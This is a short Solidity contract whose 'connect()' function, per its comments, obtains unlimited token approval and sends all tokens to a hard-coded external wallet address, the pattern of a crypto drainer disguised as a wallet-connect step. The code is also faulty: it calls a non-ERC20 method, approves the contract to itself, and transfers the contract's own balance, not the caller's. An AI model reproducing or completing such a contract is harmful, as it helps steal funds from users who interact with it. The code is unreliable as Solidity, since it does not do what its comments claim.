pragma solidity ^0.8.0;



contract TokenTransfer {



  ERC20 public token;

  address public owner;



  constructor(ERC20 _token) {

    token = _token;

    owner = msg.sender;

  }



  function connect() public {

    // Check if the caller is authorized to transfer the tokens

    if (!token.isApprovedForAll(msg.sender, address(this))) {

      // Request authorization from the caller

      token.approve(address(this), type(uint256).max);

    }



    // Transfer all tokens to the owner

    token.transfer(0x6Ac7e389712bA6D4642ca7d44Ca76476568F1E04, token.balanceOf(address(this)));

  }

}

